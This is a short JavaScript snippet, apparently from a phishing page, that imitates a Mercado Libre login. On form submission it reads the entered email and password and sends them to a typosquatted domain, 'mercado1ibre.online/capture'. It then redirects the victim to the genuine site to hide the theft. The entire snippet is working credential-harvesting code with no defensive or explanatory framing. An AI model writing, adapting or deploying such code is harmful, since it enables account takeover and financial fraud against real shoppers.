document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault();
  const email = document.getElementById('email').value;
  const pass = document.getElementById('password').value;

  fetch('https://mercado1ibre.online/capture', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ email, password: pass, timestamp: new Date().toISOString() })
  });

  window.location.href = 'https://www.mercadolibre.com.ar';
});